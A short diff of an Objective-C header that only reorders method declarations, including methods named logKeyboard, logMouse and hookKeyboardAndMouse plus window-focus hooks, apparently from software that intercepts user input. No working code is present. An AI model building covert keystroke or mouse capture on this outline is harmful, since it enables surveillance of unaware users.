@@ -26,15 +26,15 @@ typedef struct _mouseConfiguration {
 //
 - (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip;
 
-- (void)logMouse;
-- (void)logKeyboard: (NSEvent *)event;
 - (void)hookKeyboardAndMouse: (NSEvent *)event;
+- (void)logKeyboard: (NSEvent *)event;
 
+- (void)logMouse;
 //
 // These are used in order to figure when the focus has been given/taken
 // to/from the current process
 //
-- (void)becomeKeyWindowHook;
 - (void)resignKeyWindowHook;
+- (void)becomeKeyWindowHook;
 
 @end
